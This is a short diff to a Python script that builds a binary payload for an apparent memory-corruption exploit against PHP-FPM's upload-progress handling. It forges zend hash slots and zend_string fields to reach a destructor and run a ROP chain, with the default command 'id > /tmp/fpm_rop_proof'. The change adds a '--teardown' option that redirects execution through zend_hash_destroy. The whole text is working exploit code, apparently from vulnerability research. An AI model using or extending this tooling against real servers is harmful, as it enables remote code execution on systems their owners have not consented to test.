@@ -54,6 +54,12 @@ def main():
     ap.add_argument("--out", default="payload/fillU_rop_native.bin")
     ap.add_argument("--cmd", default="id > /tmp/fpm_rop_proof")
     ap.add_argument("--progress-key", default="upload_progress_x")
+    ap.add_argument("--teardown", action="store_true",
+                    help="diagnostic: point the progress hash slot at "
+                         "HT_INVALID_IDX so the upload-progress zend_hash_update "
+                         "misses (insert, not update) and never fires pDestructor "
+                         "at the update; execution then reaches the teardown "
+                         "zend_hash_destroy. Used to observe the teardown route.")
     a = ap.parse_args()
 
     buf = bytearray(open(a.base_fill, "rb").read())
@@ -92,9 +98,10 @@ def main():
     struct.pack_into("<Q", buf, V + 0x78, 0)
     _ = ret
 
-    # forge the hash slot for the progress key -> bucket 0
+    # forge the hash slot for the progress key -> bucket 0 (or make it miss, so
+    # the update inserts and execution reaches the teardown destroy).
     slot_off = V + slot_i32 * 4
-    struct.pack_into("<I", buf, slot_off, 0)
+    struct.pack_into("<I", buf, slot_off, 0xFFFFFFFF if a.teardown else 0)
 
     # fake zend_string for the progress key: only len (+0x10) and val (+0x18) are
     # read by the bucket-key comparison.
